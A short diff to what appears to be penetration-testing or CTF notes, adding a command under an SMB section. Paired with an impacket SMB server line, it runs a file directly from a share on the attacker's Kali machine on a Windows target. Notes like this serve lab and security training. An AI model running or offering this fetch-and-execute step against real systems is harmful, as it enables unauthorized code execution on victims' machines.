@@ -31,6 +31,7 @@ For background the DNS Querying Service is running nslookup and then querying th
 ### SMB
 ````
 smbserver.py -smb2support Share .
+cmd.exe /c //<your kali IP>/Share/<file name you want>
 ````
 ## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />
 
